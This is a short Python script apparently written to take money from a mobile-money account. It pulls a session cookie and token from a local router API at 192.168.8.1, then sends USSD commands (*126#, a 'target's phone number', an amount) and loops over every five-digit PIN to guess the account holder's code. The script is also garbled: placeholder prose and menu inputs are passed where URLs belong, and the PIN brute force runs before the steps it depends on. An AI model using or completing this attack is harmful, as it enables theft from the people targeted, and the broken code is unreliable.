import subprocess

def get_headers():
    response = subprocess.check_output(["curl", "-k", "-s", "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "http://192.168.8.1/api/ussd/send"])
    cookie = response.decode("utf-8").split("\n")[0].split(";")[1].split("=")[1]
    token = response.decode("utf-8").split("\n")[1].split("=")[1]
    return cookie, token

def get_curl_command(url, cookie, token):
    return f"curl -X POST '{url}' -H 'Cookie: {cookie}' -H 'x-requested-with: XMLHttpRequest' -H '__RequestVerificationToken: {token}'"

def execute_curl_commands(*curl_commands):
    error_message = ""
    for curl_command in curl_commands:
        output = subprocess.check_output(curl_command.split(" "))
        if not output:
            error_message = f"Failed to execute curl command: {curl_command}"
            break
    if error_message:
        raise Exception(error_message)

def try_curl_command(curl_command):
    output = subprocess.check_output(curl_command.split(" "))
    if not output:
        return False
    return True

if __name__ == "__main__":
    # Get the cookie and token
    cookie, token = get_headers()

    # Get the curl commands
    curl_commands = []
    curl_commands.append(get_curl_command("*126#", cookie, token))
    curl_commands.append(get_curl_command("1", cookie, token))
    curl_commands.append(get_curl_command("1", cookie, token))
    curl_commands.append(get_curl_command("Enter the targets phone number", cookie, token))
    curl_commands.append(get_curl_command("Enter the Amount", cookie, token))
    curl_commands.append(get_curl_command("1", cookie, token))

    for PIN in range(00000, 100000):
        curl_command = get_curl_command(str(PIN), cookie, token)
        if try_curl_command(curl_command):
            break

    curl_commands.append(get_curl_command("Click on the \"Submit\" button", cookie, token))

    # Execute the curl commands
    execute_curl_commands(*curl_commands)
